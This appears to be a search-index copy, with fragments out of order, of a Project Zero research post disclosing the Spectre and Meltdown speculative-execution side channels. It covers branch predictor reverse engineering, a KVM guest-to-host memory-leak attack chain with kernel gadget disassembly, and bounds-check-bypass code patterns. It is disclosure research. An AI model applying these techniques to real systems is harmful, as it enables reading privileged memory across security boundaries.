| 0x2.0000 | | 0x800.0000 | 0x4.0000 | | 0x2000.0000 | 0x10.0000 | | 0x4000.0000 | 0x20.0000 | In other words, if a source address is XORed with both numbers in a row of this table, the branch predictor will not be able to distinguish the resulting address from the original source address when performing a lookup. For example, the branch predictor is able to distinguish source addresses 0x100.0000 and 0x180.0000, and it can also distinguish source addresses 0x100.0000 and 0x180.8000, but it can't distinguish source addresses 0x100.0000 and 0x140.2000 or source addresses 0x100.0000 and 0x180.4000. In the following, this will be referred to as aliased source addresses. When an aliased source address is used, the branch predictor will still predict the same target as for the unaliased source address. This indicates that the branch predictor stores a truncated absolute destination address, but that hasn't been verified. Based on observed maximum forward and backward jump distances for different source addresses, the low 32-bit half of the target address could be stored as an absolute 32-bit value with an additional bit that specifies whether the jump from source to target crosses a 232 boundary; if the jump crosses such a boundary, bit 31 of the source address determines whether the high half of the instruction pointer should increment or decrement. Indirect call predictor The inputs of the BTB lookup for this mechanism seem to be: The low 12 bits of the address of the source instruction (we are not sure whether it's the address of the first or the last byte) or a subset of them. The branch history buffer state. If the indirect call predictor can't resolve a branch, it is resolved by the generic predictor instead. Intel's optimization manual hints at this behavior: \"Indirect Calls and Jumps. These may either be predicted as having a monotonic target or as having targets that vary in accordance with recent program behavior.\" The branch history buffer (BHB) stores information about the last 29 taken branches - basically a fingerprint of recent control flow - and is used to allow better prediction of indirect calls that can have multiple targets. The update function of the BHB works as follows (in pseudocode; src is the address of the last byte of the source instruction, dst is the destination address): void bhb_update(uint58_t *bhb_state, unsigned long src, unsigned long dst) { *bhb_state <<= 2; *bhb_state ^= (dst & 0x3f); *bhb_state ^= (src & 0xc0) >> 6; *bhb_state ^= (src & 0xc00) >> (10 - 2); *bhb_state ^= (src & 0xc000) >> (14 - 4); *bhb_state ^= (src & 0x30) << (6 - 4); *bhb_state ^= (src & 0x300) << (8 - 8); *bhb_state ^= (src & 0x3000) >> (12 - 10); *bhb_state ^= (src & 0x30000) >> (16 - 12); *bhb_state ^= (src & 0xc0000) >> (18 - 14); } Some of the bits of the BHB state seem to be folded together further using XOR when used for a BTB access, but the precise folding function hasn't been understood yet. The BHB is interesting for two reasons. First, knowledge about its approximate behavior is required in order to be able to accurately cause collisions in the indirect call predictor. But it also permits dumping out the BHB state at any repeatable program state at which the attacker can execute code - for example, when attacking a hypervisor, directly after a hypercall. The dumped BHB state can then be used to fingerprint the hypervisor or, if the attacker has access to the hypervisor binary, to determine the low 20 bits of the hypervisor load address (in the case of KVM: the low 20 bits of the load address of kvm-intel.ko). Reverse-Engineering Branch Predictor Internals This subsection describes how we reverse-engineered the internals of the Haswell branch predictor. Some of this is written down from memory, since we didn't keep a detailed record of what we were doing. We initially attempted to perform BTB injections into the kernel using the generic predictor, using the knowledge from prior research that the generic predictor only looks at the lower half of the source address and that only a partial target address is stored. This kind of worked - however, the injection success rate was very low, below 1%. (This is the method we used in our preliminary PoCs for method 2 against modified hypervisors running on Haswell.) We decided to write a userspace test case to be able to more easily test branch predictor behavior in different situations. Based on the assumption that branch predictor state is shared between hyperthreads [10], we wrote a program of which two instances are each pinned to one of the two logical processors running on a specific physical core, where one instance attempts to perform branch injections while the other measures how often branch injections are successful. Both instances were executed with ASLR disabled and had the same code at the same addresses. The injecting process performed indirect calls to a function that accesses a (per-process) test variable; the measuring process performed indirect calls to a function that tests, based on timing, whether the per-process test variable is cached, and then evicts it using CLFLUSH. Both indirect calls were performed through the same callsite. Before each indirect call, the function pointer stored in memory was flushed out to main memory using CLFLUSH to widen the speculation time window. Additionally, because of the reference to \"recent program behavior\" in Intel's optimization manual, a bunch of conditional branches that are always taken were inserted in front of the indirect call. In this test, the injection success rate was above 99%, giving us a base setup for future experiments. We then tried to figure out the details of the prediction scheme. We assumed that the prediction scheme uses a global branch history buffer of some kind. To determine the duration for which branch information stays in the history buffer, a conditional branch that is only taken in one of the two program instances was inserted in front of the series of always-taken conditional jumps, then the number of always-taken conditional jumps (N) was varied. The result was that for N=25, the processor was able to distinguish the branches (misprediction rate under 1%), but for N=26, it failed to do so (misprediction rate over 99%). Therefore, the branch history buffer had to be able to store information about at least the last 26 branches. The code in one of the two program instances was then moved around in memory. This revealed that only the lower 20 bits of the source and target addresses have an influence on the branch history buffer. Testing with different types of branches in the two program instances revealed that static jumps, taken conditional jumps, calls and returns influence the branch history buffer the same way; non-taken conditional jumps don't influence it; the address of the last byte of the source instruction is the one that counts; IRETQ doesn't influence the history buffer state (which is useful for testing because it permits creating program flow that is invisible to the history buffer). Moving the last conditional branch before the indirect call around in memory multiple times revealed that the branch history buffer contents can be used to distinguish many different locations of that last conditional branch instruction. This suggests that the history buffer doesn't store a list of small history values; instead, it seems to be a larger buffer in which history data is mixed together. However, a history buffer needs to \"forget\" about past branches after a certain number of new branches have been taken in order to be useful for branch prediction. Therefore, when new data is mixed into the history buffer, this can not cause information in bits that are already present in the history buffer to propagate downwards - and given that, upwards combination of information probably wouldn't be very useful either. Given that branch prediction also must be very fast, we concluded that it is likely that the update function of the history buffer left-shifts the old history buffer, then XORs in the new state (see diagram). If this assumption is correct, then the history buffer contains a lot of information about the most recent branches, but only contains as many bits of information as are shifted per history buffer update about the last branch about which it contains any data. Therefore, we tested whether flipping different bits in the source and target addresses of a jump followed by 32 always-taken jumps with static source and target allows the branch prediction to disambiguate an indirect call. [11] With 32 static jumps in between, no bit flips seemed to have an influence, so we decreased the number of static jumps until a difference was observable. The result with 28 always-taken jumps in between was that bits 0x1 and 0x2 of the target and bits 0x40 and 0x80 of the source had such an influence; but flipping both 0x1 in the target and 0x40 in the source or 0x2 in the target and 0x80 in the source did not permit disambiguation. This shows that the per-insertion shift of the history buffer is 2 bits and shows which data is stored in the least significant bits of the history buffer. We then repeated this with decreased amounts of fixed jumps after the bit-flipped jump to determine which information is stored in the remaining bits. Reading host memory from a KVM guest Locating the host kernel Our PoC locates the host kernel in several steps. The information that is determined and necessary for the next steps of the attack consists of: lower 20 bits of the address of kvm-intel.ko full address of kvm.ko full address of vmlinux Looking back, this is unnecessarily complicated, but it nicely demonstrates the various techniques an attacker can use. A simpler way would be to first determine the address of vmlinux, then bisect the addresses of kvm.ko and kvm-intel.ko. In the first step, the address of kvm-intel.ko is leaked. For this purpose, the branch history buffer state after guest entry is dumped out. Then, for every possible value of bits 12..19 of the load address of kvm-intel.ko, the expected lowest 16 bits of the history buffer are computed based on the load address guess and the known offsets of the last 8 branches before guest entry, and the results are compared against the lowest 16 bits of the leaked history buffer state. The branch history buffer state is leaked in steps of 2 bits by measuring misprediction rates of an indirect call with two targets. One way the indirect call is reached is from a vmcall instruction followed by a series of N branches whose relevant source and target address bits are all zeroes. The second way the indirect call is reached is from a series of controlled branches in userspace that can be used to write arbitrary values into the branch history buffer. Misprediction rates are measured as in the section \"Reverse-Engineering Branch Predictor Internals\", using one call target that loads a cache line and another one that checks whether the same cache line has been loaded. With N=29, mispredictions will occur at a high rate if the controlled branch history buffer value is zero because all history buffer state from the hypercall has been erased. With N=28, mispredictions will occur if the controlled branch history buffer value is one of 0<<(28 2), 1<<(28 2), 2<<(28 2), 3<<(28 2) - by testing all four possibilities, it can be detected which one is right. Then, for decreasing values of N, the four possibilities are {0|1|2|3}<<(28*2) | (history_buffer_for(N+1) >> 2). By repeating this for decreasing values for N, the branch history buffer value for N=0 can be determined. At this point, the low 20 bits of kvm-intel.ko are known; the next step is to roughly locate kvm.ko. For this, the generic branch predictor is used, using data inserted into the BTB by an indirect call from kvm.ko to kvm-intel.ko that happens on every hypercall; this means that the source address of the indirect call has to be leaked out of the BTB. kvm.ko will probably be located somewhere in the range from 0xffffffffc0000000 to 0xffffffffc4000000, with page alignment (0x1000). This means that the first four entries in the table in the section \"Generic Predictor\" apply; there will be 24-1=15 aliasing addresses for the correct one. But that is also an advantage: It cuts down the search space from 0x4000 to 0x4000/24=1024. To find the right address for the source or one of its aliasing addresses, code that loads data through a specific register is placed at all possible call targets (the leaked low 20 bits of kvm-intel.ko plus the in-module offset of the call target plus a multiple of 220) and indirect calls are placed at all possible call sources. Then, alternatingly, hypercalls are performed and indirect calls are performed through the different possible non-aliasing call sources, with randomized history buffer state that prevents the specialized prediction from working. After this step, there are 216 remaining possibilities for the load address of kvm.ko. Next, the load address of vmlinux can be determined in a similar way, using an indirect call from vmlinux to kvm.ko. Luckily, none of the bits which are randomized in the load address of vmlinux are folded together, so unlike when locating kvm.ko, the result will directly be unique. vmlinux has an alignment of 2MiB and a randomization range of 1GiB, so there are still only 512 possible addresses. Because (as far as we know) a simple hypercall won't actually cause indirect calls from vmlinux to kvm.ko, we instead use port I/O from the status register of an emulated serial port, which is present in the default configuration of a virtual machine created with virt-manager. The only remaining piece of information is which one of the 16 aliasing load addresses of kvm.ko is actually correct. Because the source address of an indirect call to kvm.ko is known, this can be solved using bisection: Place code at the various possible targets that, depending on which instance of the code is speculatively executed, loads one of two cache lines, and measure which one of the cache lines gets loaded. Identifying cache sets The PoC assumes that the VM does not have access to hugepages.To discover eviction sets for all L3 cache sets with a specific alignment relative to a 4KiB page boundary, the PoC first allocates 25600 pages of memory. Then, in a loop, it selects random subsets of all remaining unsorted pages such that the expected number of sets for which an eviction set is contained in the subset is 1, reduces each subset down to an eviction set by repeatedly accessing its cache lines and testing whether the cache lines are always cached (in which case they're probably not part of an eviction set) and attempts to use the new eviction set to evict all remaining unsorted cache lines to determine whether they are in the same cache set [12]. Locating the host-virtual address of a guest page Because this attack uses a FLUSH+RELOAD approach for leaking data, it needs to know the host-kernel-virtual address of one guest page. Alternative approaches such as PRIME+PROBE should work without that requirement. The basic idea for this step of the attack is to use a branch target injection attack against the hypervisor to load an attacker-controlled address and test whether that caused the guest-owned page to be loaded. For this, a gadget that simply loads from the memory location specified by R8 can be used - R8-R11 still contain guest-controlled values when the first indirect call after a guest exit is reached on this kernel build. We expected that an attacker would need to either know which eviction set has to be used at this point or brute-force it simultaneously; however, experimentally, using random eviction sets works, too. Our theory is that the observed behavior is actually the result of L1D and L2 evictions, which might be sufficient to permit a few instructions worth of speculative execution. The host kernel maps (nearly?) all physical memory in the physmap area, including memory assigned to KVM guests. However, the location of the physmap is randomized (with a 1GiB alignment), in an area of size 128PiB. Therefore, directly bruteforcing the host-virtual address of a guest page would take a long time. It is not necessarily impossible; as a ballpark estimate, it should be possible within a day or so, maybe less, assuming 12000 successful injections per second and 30 guest pages that are tested in parallel; but not as impressive as doing it in a few minutes. To optimize this, the problem can be split up: First, brute-force the physical address using a gadget that can load from physical addresses, then brute-force the base address of the physmap region. Because the physical address can usually be assumed to be far below 128PiB, it can be brute-forced more efficiently, and brute-forcing the base address of the physmap region afterwards is also easier because then address guesses with 1GiB alignment can be used. To brute-force the physical address, the following gadget can be used: ffffffff810a9def: 4c 89 c0 mov rax,r8 ffffffff810a9df2: 4d 63 f9 movsxd r15,r9d ffffffff810a9df5: 4e 8b 04 fd c0 b3 a6 mov r8,QWORD PTR [r15*8-0x7e594c40] ffffffff810a9dfc: 81 ffffffff810a9dfd: 4a 8d 3c 00 lea rdi,[rax+r8*1] ffffffff810a9e01: 4d 8b a4 00 f8 00 00 mov r12,QWORD PTR [r8+rax*1+0xf8] ffffffff810a9e08: 00 This gadget permits loading an 8-byte-aligned value from the area around the kernel text section by setting R9 appropriately, which in particular permits loading page_offset_base, the start address of the physmap. Then, the value that was originally in R8 - the physical address guess minus 0xf8 - is added to the result of the previous load, 0xfa is added to it, and the result is dereferenced. Cache set selection To select the correct L3 eviction set, the attack from the following section is essentially executed with different eviction sets until it works. Leaking data At this point, it would normally be necessary to locate gadgets in the host kernel code that can be used to actually leak data by reading from an attacker-controlled location, shifting and masking the result appropriately and then using the result of that as offset to an attacker-controlled address for a load. But piecing gadgets together and figuring out which ones work in a speculation context seems annoying. So instead, we decided to use the eBPF interpreter, which is built into the host kernel - while there is no legitimate way to invoke it from inside a VM, the presence of the code in the host kernel's text section is sufficient to make it usable for the attack, just like with ordinary ROP gadgets. The eBPF interpreter entry point has the following function signature: static unsigned int __bpf_prog_run(void ctx, const struct bpf_insn insn) The second parameter is a pointer to an array of statically pre-verified eBPF instructions to be executed - which means that __bpf_prog_run() will not perform any type checks or bounds checks. The first parameter is simply stored as part of the initial emulated register state, so its value doesn't matter. The eBPF interpreter provides, among other things: multiple emulated 64-bit registers 64-bit immediate writes to emulated registers memory reads from addresses stored in emulated registers bitwise operations (including bit shifts) and arithmetic operations To call the interpreter entry point, a gadget that gives RSI and RIP control given R8-R11 control and controlled data at a known memory location is necessary. The following gadget provides this functionality: ffffffff81514edd: 4c 89 ce mov rsi,r9 ffffffff81514ee0: 41 ff 90 b0 00 00 00 call QWORD PTR [r8+0xb0] Now, by pointing R8 and R9 at the mapping of a guest-owned page in the physmap, it is possible to speculatively execute arbitrary unvalidated eBPF bytecode in the host kernel. Then, relatively straightforward bytecode can be used to leak data into the cache. Variant 3: Rogue data cache load Basically, read Anders Fogh's blogpost: https://cyber.wtf/2017/07/28/negative-result-reading-kernel-memory-from-user-mode/ In summary, an attack using this variant of the issue attempts to read kernel memory from userspace without misdirecting the control flow of kernel code. This works by using the code pattern that was used for the previous variants, but in userspace. The underlying idea is that the permission check for accessing an address might not be on the critical path for reading data from memory to a register, where the permission check could have significant performance impact. Instead, the memory read could make the result of the read available to following instructions immediately and only perform the permission check asynchronously, setting a flag in the reorder buffer that causes an exception to be raised if the permission check fails. We do have a few additions to make to Anders Fogh's blogpost: \"Imagine the following instruction executed in usermode mov rax,[somekernelmodeaddress] It will cause an interrupt when retired, [...]\" It is also possible to already execute that instruction behind a high-latency mispredicted branch to avoid taking a page fault. This might also widen the speculation window by increasing the delay between the read from a kernel address and delivery of the associated exception. \"First, I call a syscall that touches this memory. Second, I use the prefetcht0 instruction to improve my odds of having the address loaded in L1.\" When we used prefetch instructions after doing a syscall, the attack stopped working for us, and we have no clue why. Perhaps the CPU somehow stores whether access was denied on the last access and prevents the attack from working if that is the case? \"Fortunately I did not get a slow read suggesting that Intel null\u2019s the result when the access is not allowed.\" That (read from kernel address returns all-zeroes) seems to happen for memory that is not sufficiently cached but for which pagetable entries are present, at least after repeated read attempts. For unmapped memory, the kernel address read does not return a result at all. Ideas for further research We believe that our research provides many remaining research topics that we have not yet investigated, and we encourage other public researchers to look into these. This section contains an even higher amount of speculation than the rest of this blogpost - it contains untested ideas that might well be useless. Leaking without data cache timing It would be interesting to explore whether there are microarchitectural attacks other than measuring data cache timing that can be used for exfiltrating data out of speculative execution. Other microarchitectures Our research was relatively Haswell-centric so far. It would be interesting to see details e.g. on how the branch prediction of other modern processors works and how well it can be attacked. Other JIT engines We developed a successful variant 1 attack against the JIT engine built into the Linux kernel. It would be interesting to see whether attacks against more advanced JIT engines with less control over the system are also practical - in particular, JavaScript engines. More efficient scanning for host-virtual addresses and cache sets In variant 2, while scanning for the host-virtual address of a guest-owned page, it might make sense to attempt to determine its L3 cache set first. This could be done by performing L3 evictions using an eviction pattern through the physmap, then testing whether the eviction affected the guest-owned page. The same might work for cache sets - use an L1D+L2 eviction set to evict the function pointer in the host kernel context, use a gadget in the kernel to evict an L3 set using physical addresses, then use that to identify which cache sets guest lines belong to until a guest-owned eviction set has been constructed. Dumping the complete BTB state Given that the generic BTB seems to only be able to distinguish 231-8 or fewer source addresses, it seems feasible to dump out the complete BTB state generated by e.g. a hypercall in a timeframe around the order of a few hours. (Scan for jump sources, then for every discovered jump source, bisect the jump target.) This could potentially be used to identify the locations of functions in the host kernel even if the host kernel is custom-built. The source address aliasing would reduce the usefulness somewhat, but because target addresses don't suffer from that, it might be possible to correlate (source,target) pairs from machines with different KASLR offsets and reduce the number of candidate addresses based on KASLR being additive while aliasing is bitwise. This could then potentially allow an attacker to make guesses about the host kernel version or the compiler used to build it based on jump offsets or distances between functions. Variant 2: Leaking with more efficient gadgets If sufficiently efficient gadgets are used for variant 2, it might not be necessary to evict host kernel function pointers from the L3 cache at all; it might be sufficient to only evict them from L1D and L2. Various speedups In particular the variant 2 PoC is still a bit slow. This is probably partly because: It only leaks one bit at a time; leaking more bits at a time should be doable. It heavily uses IRETQ for hiding control flow from the processor. It would be interesting to see what data leak rate can be achieved using variant 2. Leaking or injection through the return predictor If the return predictor also doesn't lose its state on a privilege level change, it might be useful for either locating the host kernel from inside a VM (in which case bisection could be used to very quickly discover the full address of the host kernel) or injecting return targets (in particular if the return address is stored in a cache line that can be flushed out by the attacker and isn't reloaded before the return instruction). However, we have not performed any experiments with the return predictor that yielded conclusive results so far. Leaking data out of the indirect call predictor We have attempted to leak target information out of the indirect call predictor, but haven't been able to make it work. Vendor statements The following statement were provided to us regarding this issue from the vendors to whom Project Zero disclosed this vulnerability: Intel Intel is committed to improving the overall security of computer systems. The methods described here rely on common properties of modern microprocessors. Thus, susceptibility to these methods is not limited to Intel processors, nor does it mean that a processor is working outside its intended functional specification. Intel is working closely with our ecosystem partners, as well as with other silicon vendors whose processors are affected, to design and distribute both software and hardware mitigations for these methods. For more information and links to useful resources, visit: https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00088&languageid=en-fr http://newsroom.intel.com/wp-content/uploads/sites/11/2018/01/Intel-Analysis-of-Speculative-Execution-Side-Channels.pdf AMD AMD provided the following link: http://www.amd.com/en/corporate/speculative-execution ARM Arm recognises that the speculation functionality of many modern high-performance processors, despite working as intended, can be used in conjunction with the timing of cache operations to leak some information as described in this blog. Correspondingly, Arm has developed software mitigations that we recommend be deployed. Specific details regarding the affected processors and mitigations can be found at this website: https://developer.arm.com/support/security-update Arm has included a detailed technical whitepaper as well as links to information from some of Arm\u2019s architecture partners regarding their specific implementations and mitigations. Literature Note that some of these documents - in particular Intel's documentation - change over time, so quotes from and references to it may not reflect the latest version of Intel's documentation. https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-optimization-manual.pdf : Intel's optimization manual has many interesting pieces of optimization advice that hint at relevant microarchitectural behavior; for example: \"Placing data immediately following an indirect branch can cause a performance problem. If the data consists of all zeros, it looks like a long stream of ADDs to memory destinations and this can cause resource conflicts and slow down branch recovery. Also, data immediately following indirect branches may appear as branches to the branch predication [sic] hardware, which can branch off to execute other data pages. This can lead to subsequent self-modifying code problems.\" \"Loads can:[...]Be carried out speculatively, before preceding branches are resolved.\" \"Software should avoid writing to a code page in the same 1-KByte subpage that is being executed or fetching code in the same 2-KByte subpage of that is being written. In addition, sharing a page containing directly or speculatively executed code with another processor as a data page can trigger an SMC condition that causes the entire pipeline of the machine and the trace cache to be cleared. This is due to the self-modifying code condition.\" \"if mapped as WB or WT, there is a potential for speculative processor reads to bring the data into the caches\" \"Failure to map the region as WC may allow the line to be speculatively read into the processor caches (via the wrong path of a mispredicted branch).\" https://software.intel.com/en-us/articles/intel-sdm : Intel's Software Developer Manuals http://www.agner.org/optimize/microarchitecture.pdf : Agner Fog's documentation of reverse-engineered processor behavior and relevant theory was very helpful for this research. http://www.cs.binghamton.edu/~dima/micro16.pdf and https://github.com/felixwilhelm/mario_baslr : Prior research by Dmitry Evtyushkin, Dmitry Ponomarev and Nael Abu-Ghazaleh on abusing branch target buffer behavior to leak addresses that we used as a starting point for analyzing the branch prediction of Haswell processors. Felix Wilhelm's research based on this provided the basic idea behind variant 2. https://arxiv.org/pdf/1507.06955.pdf : The rowhammer.js research by Daniel Gruss, Cl\u00e9mentine Maurice and Stefan Mangard contains information about L3 cache eviction patterns that we reused in the KVM PoC to evict a function pointer. https://xania.org/201602/bpu-part-one : Matt Godbolt blogged about reverse-engineering the structure of the branch predictor on Intel processors. https://www.sophia.re/thesis.pdf : Sophia D'Antoine wrote a thesis that shows that opcode scheduling can theoretically be used to transmit data between hyperthreads. https://gruss.cc/files/kaiser.pdf : Daniel Gruss, Moritz Lipp, Michael Schwarz, Richard Fellner, Cl\u00e9mentine Maurice, and Stefan Mangard wrote a paper on mitigating microarchitectural issues caused by pagetable sharing between userspace and the kernel. https://www.jilp.org/ : This journal contains many articles on branch prediction. http://blog.stuffedcow.net/2013/01/ivb-cache-replacement/ : This blogpost by Henry Wong investigates the L3 cache replacement policy used by Intel's Ivy Bridge architecture. References [1] This initial report did not contain any information about variant 3. We had discussed whether direct reads from kernel memory could work, but thought that it was unlikely. We later tested and reported variant 3 prior to the publication of Anders Fogh's work at https://cyber.wtf/2017/07/28/negative-result-reading-kernel-memory-from-user-mode/ . [2] The precise model names are listed in the section \"Tested Processors\". The code for reproducing this is in the writeup_files.tar archive in our bugtracker, in the folders userland_test_x86 and userland_test_aarch64. [3] The attacker-controlled offset used to perform an out-of-bounds access on an array by this PoC is a 32-bit value, limiting the accessible addresses to a 4GiB window in the kernel heap area. [4] This PoC won't work on CPUs with SMAP support; however, that is not a fundamental limitation. [5] linux-image-4.9.0-3-amd64 at version 4.9.30-2+deb9u2 (available at http://snapshot.debian.org/archive/debian/20170701T224614Z/pool/main/l/linux/linux-image-4.9.0-3-amd64_4.9.30-2%2Bdeb9u2_amd64.deb , sha256 5f950b26aa7746d75ecb8508cc7dab19b3381c9451ee044cd2edfd6f5efff1f8, signed via Release.gpg , Release , Packages.xz ); that was the current distro kernel version when I set up the machine. It is very unlikely that the PoC works with other kernel versions without changes; it contains a number of hardcoded addresses/offsets. [6] The phone was running an Android build from May 2017. [7] https://software.intel.com/en-us/articles/intel-sdm [8] https://software.intel.com/en-us/articles/avoiding-and-identifying-false-sharing-among-threads , section \"background\" [9] More than 215 mappings would be more efficient, but the kernel places a hard cap of 216 on the number of VMAs that a process can have. [10] Intel's optimization manual states that \"In the first implementation of HT Technology, the physical execution resources are shared and the architecture state is duplicated for each logical processor\", so it would be plausible for predictor state to be shared. While predictor state could be tagged by logical core, that would likely reduce performance for multithreaded processes, so it doesn't seem likely. [11] In case the history buffer was a bit bigger than we had measured, we added some margin - in particular because we had seen slightly different history buffer lengths in different experiments, and because 26 isn't a very round number. [12] The basic idea comes from http://palms.ee.princeton.edu/system/files/SP_vfinal.pdf , section IV, although the authors of that paper still used hugepages. \u539f\u6587\u94fe\u63a5\uff1a https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html","title":"Reading privileged memory with a side channel"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#reading-privileged-memory-with-a-side-channel","text":"Posted by Jann Horn, Project Zero We have discovered that CPU data cache timing can be abused to efficiently leak information out of mis-speculated execution, leading to (at worst) arbitrary virtual memory read vulnerabilities across local security boundaries in various contexts. Variants of this issue are known to affect many modern processors, including certain processors by Intel, AMD and ARM. For a few Intel and AMD CPU models, we have exploits that work against real software. We reported this issue to Intel, AMD and ARM on 2017-06-01 [1]. So far, there are three known variants of the issue: Variant 1: bounds check bypass (CVE-2017-5753) Variant 2: branch target injection (CVE-2017-5715) Variant 3: rogue data cache load (CVE-2017-5754) Before the issues described here were publicly disclosed, Daniel Gruss, Moritz Lipp, Yuval Yarom, Paul Kocher, Daniel Genkin, Michael Schwarz, Mike Hamburg, Stefan Mangard, Thomas Prescher and Werner Haas also reported them; their [writeups/blogposts/paper drafts] are at: Spectre (variants 1 and 2) Meltdown (variant 3) During the course of our research, we developed the following proofs of concept (PoCs): A PoC that demonstrates the basic principles behind variant 1 in userspace on the tested Intel Haswell Xeon CPU, the AMD FX CPU, the AMD PRO CPU and an ARM Cortex A57 [2]. This PoC only tests for the ability to read data inside mis-speculated execution within the same process, without crossing any privilege boundaries. A PoC for variant 1 that, when running with normal user privileges under a modern Linux kernel with a distro-standard config, can perform arbitrary reads in a 4GiB range [3] in kernel virtual memory on the Intel Haswell Xeon CPU. If the kernel's BPF JIT is enabled (non-default configuration), it also works on the AMD PRO CPU. On the Intel Haswell Xeon CPU, kernel virtual memory can be read at a rate of around 2000 bytes per second after around 4 seconds of startup time. [4] A PoC for variant 2 that, when running with root privileges inside a KVM guest created using virt-manager on the Intel Haswell Xeon CPU, with a specific (now outdated) version of Debian's distro kernel [5] running on the host, can read host kernel memory at a rate of around 1500 bytes/second, with room for optimization. Before the attack can be performed, some initialization has to be performed that takes roughly between 10 and 30 minutes for a machine with 64GiB of RAM; the needed time should scale roughly linearly with the amount of host RAM. (If 2MB hugepages are available to the guest, the initialization should be much faster, but that hasn't been tested.) A PoC for variant 3 that, when running with normal user privileges, can read kernel memory on the Intel Haswell Xeon CPU under some precondition. We believe that this precondition is that the targeted kernel memory is present in the L1D cache. For interesting resources around this topic, look down into the \"Literature\" section. A warning regarding explanations about processor internals in this blogpost: This blogpost contains a lot of speculation about hardware internals based on observed behavior, which might not necessarily correspond to what processors are actually doing. We have some ideas on possible mitigations and provided some of those ideas to the processor vendors; however, we believe that the processor vendors are in a much better position than we are to design and evaluate mitigations, and we expect them to be the source of authoritative guidance. The PoC code and the writeups that we sent to the CPU vendors are available here: https://bugs.chromium.org/p/project-zero/issues/detail?id=1272 .","title":"Reading privileged memory with a side-channel"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#tested-processors","text":"Intel(R) Xeon(R) CPU E5-1650 v3 @ 3.50GHz (called \"Intel Haswell Xeon CPU\" in the rest of this document) AMD FX(tm)-8320 Eight-Core Processor (called \"AMD FX CPU\" in the rest of this document) AMD PRO A8-9600 R7, 10 COMPUTE CORES 4C+6G (called \"AMD PRO CPU\" in the rest of this document) An ARM Cortex A57 core of a Google Nexus 5x phone [6] (called \"ARM Cortex A57\" in the rest of this document)","title":"Tested Processors"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#glossary","text":"retire: An instruction retires when its results, e.g. register writes and memory writes, are committed and made visible to the rest of the system. Instructions can be executed out of order, but must always retire in order. logical processor core: A logical processor core is what the operating system sees as a processor core. With hyperthreading enabled, the number of logical cores is a multiple of the number of physical cores. cached/uncached data: In this blogpost, \"uncached\" data is data that is only present in main memory, not in any of the cache levels of the CPU. Loading uncached data will typically take over 100 cycles of CPU time. speculative execution: A processor can execute past a branch without knowing whether it will be taken or where its target is, therefore executing instructions before it is known whether they should be executed. If this speculation turns out to have been incorrect, the CPU can discard the resulting state without architectural effects and continue execution on the correct execution path. Instructions do not retire before it is known that they are on the correct execution path. mis-speculation window: The time window during which the CPU speculatively executes the wrong code and has not yet detected that mis-speculation has occurred.","title":"Glossary"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#variant-1-bounds-check-bypass","text":"This section explains the common theory behind all three variants and the theory behind our PoC for variant 1 that, when running in userspace under a Debian distro kernel, can perform arbitrary reads in a 4GiB region of kernel memory in at least the following configurations: Intel Haswell Xeon CPU, eBPF JIT is off (default state) Intel Haswell Xeon CPU, eBPF JIT is on (non-default state) AMD PRO CPU, eBPF JIT is on (non-default state) The state of the eBPF JIT can be toggled using the net.core.bpf_jit_enable sysctl.","title":"Variant 1: Bounds check bypass"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#theoretical-explanation","text":"The Intel Optimization Reference Manual says the following regarding Sandy Bridge (and later microarchitectural revisions) in section 2.3.2.3 (\"Branch Prediction\"): Branch prediction predicts the branch target and enables the processor to begin executing instructions long before the branch true execution path is known. In section 2.3.5.2 (\"L1 DCache\"): Loads can: [...] * Be carried out speculatively, before preceding branches are resolved. * Take cache misses out of order and in an overlapped manner. Intel's Software Developer's Manual [7] states in Volume 3A, section 11.7 (\"Implicit Caching (Pentium 4, Intel Xeon, and P6 family processors\"): Implicit caching occurs when a memory element is made potentially cacheable, although the element may never have been accessed in the normal von Neumann sequence. Implicit caching occurs on the P6 and more recent processor families due to aggressive prefetching, branch prediction, and TLB miss handling. Implicit caching is an extension of the behavior of existing Intel386, Intel486, and Pentium processor systems, since software running on these processor families also has not been able to deterministically predict the behavior of instruction prefetch. Consider the code sample below. If arr1->length is uncached, the processor can speculatively load data from arr1->data[untrusted_offset_from_caller]. This is an out-of-bounds read. That should not matter because the processor will effectively roll back the execution state when the branch has executed; none of the speculatively executed instructions will retire (e.g. cause registers etc. to be affected). struct array { unsigned long length; unsigned char data[]; }; struct array *arr1 = ...; unsigned long untrusted_offset_from_caller = ...; if (untrusted_offset_from_caller < arr1->length) { unsigned char value = arr1->data[untrusted_offset_from_caller]; ... } However, in the following code sample, there's an issue. If arr1->length, arr2->data[0x200] and arr2->data[0x300] are not cached, but all other accessed data is, and the branch conditions are predicted as true, the processor can do the following speculatively before arr1->length has been loaded and the execution is re-steered: load value = arr1->data[untrusted_offset_from_caller] start a load from a data-dependent offset in arr2->data, loading the corresponding cache line into the L1 cache struct array { unsigned long length; unsigned char data[]; }; struct array arr1 = ...; / small array */ struct array arr2 = ...; / array of size 0x400 */ / >0x400 (OUT OF BOUNDS!) / unsigned long untrusted_offset_from_caller = ...; if (untrusted_offset_from_caller < arr1->length) { unsigned char value = arr1->data[untrusted_offset_from_caller]; unsigned long index2 = ((value&1)*0x100)+0x200; if (index2 < arr2->length) { unsigned char value2 = arr2->data[index2]; } } After the execution has been returned to the non-speculative path because the processor has noticed that untrusted_offset_from_caller is bigger than arr1->length, the cache line containing arr2->data[index2] stays in the L1 cache. By measuring the time required to load arr2->data[0x200] and arr2->data[0x300], an attacker can then determine whether the value of index2 during speculative execution was 0x200 or 0x300 - which discloses whether arr1->data[untrusted_offset_from_caller]&1 is 0 or 1. To be able to actually use this behavior for an attack, an attacker needs to be able to cause the execution of such a vulnerable code pattern in the targeted context with an out-of-bounds index. For this, the vulnerable code pattern must either be present in existing code, or there must be an interpreter or JIT engine that can be used to generate the vulnerable code pattern. So far, we have not actually identified any existing, exploitable instances of the vulnerable code pattern; the PoC for leaking kernel memory using variant 1 uses the eBPF interpreter or the eBPF JIT engine, which are built into the kernel and accessible to normal users. A minor variant of this could be to instead use an out-of-bounds read to a function pointer to gain control of execution in the mis-speculated path. We did not investigate this variant further.","title":"Theoretical 